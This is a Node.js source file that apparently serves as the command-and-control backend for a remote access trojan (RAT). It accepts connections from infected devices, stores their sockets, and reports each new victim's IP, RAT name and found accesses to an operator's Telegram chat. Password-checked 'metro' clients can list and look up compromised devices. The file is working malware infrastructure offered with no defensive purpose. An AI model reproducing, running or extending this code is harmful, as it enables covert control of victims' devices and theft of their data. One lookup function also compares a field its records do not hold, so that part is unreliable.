const net = require("net");
const TelegramBot = require("node-telegram-bot-api");
const { UserDataTransform } = require("../transform");

const udt = new UserDataTransform();
let accepted_users = [];

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

const getUsersByPort = async (portname, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getUserByDeviceId = async (portname, devid, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId"
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId"
        });
    })
}

const server = net.createServer(async (socket) => {
    socket.on('data', async (data) => {
        try{
            let message = JSON.parse(data.toString());
            if (Object.keys(message).includes("mask")){
                if (message.mask == "metro"){
                    if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                        await udt.getUserByPort(message.port, message.password, async (_port) => {
                            if (!_port.status){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "INVALID_PORT_OR_PASSWORD"
                                }));
                                return;
                            }

                            if (_port.user.is_ban){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "YOU_BANNED"
                                }));
                                return;
                            }

                            if (message.method == "getUsers"){
                                await getUsersByPort(message.port, async (allusers) => {
                                    socket.write(JSON.stringify(allusers));
                                })
                            }

                            if (message.method == "getUserByDeviceId"){
                                await getUserByDeviceId(message.port, message.device_id, async (user) => {
                                    socket.write(JSON.stringify(user));
                                })
                            }

                        })
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            method: Object.keys(message).includes("method") ? message.method : "error",
                            message: "PORT_AND_PASSWORD_NOT_FOUND"
                        }));
                        return;
                    }
                } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                    await udt.getUserByPort(message.port, message.password, async (prt) => {
                        if (prt.status){
                            accepted_users.push({
                                socket: socket,
                                port: prt.port,
                                device_id: message.device_id,
                                access: message.accessory
                            })
                            socket.write(JSON.stringify({
                                status: true
                            }));
                            let cli = new TelegramBot(prt.port.token);
                            cli.sendMessage(
                                prt.port.chat_id,
                                build(`🕸 | new user connected\n\n`) + `🛠 | /sign_${message.device_id}\n` + build(`\n🌐 | ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 | rat: ${message.rat}\n🔵 | ${message.accessory.length} access were found`),
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else {
                            socket.write(JSON.stringify({
                                status: false,
                                message: "INVALID_PORT_OR_PASSWORD"
                            }))
                        }
                    })
                }
            }
        } catch (e){ console.log(e);socket.write(JSON.stringify({
            status: false,
            method: "Error",
            message: "INVALID_DATA_TYPE"
        })) }
    })
})

server.listen(9932, "0.0.0.0", () => {
    console.log("[B] socket-server connected");
    console.log("[B] socket-connection -> 127.0.0.1:9932");
})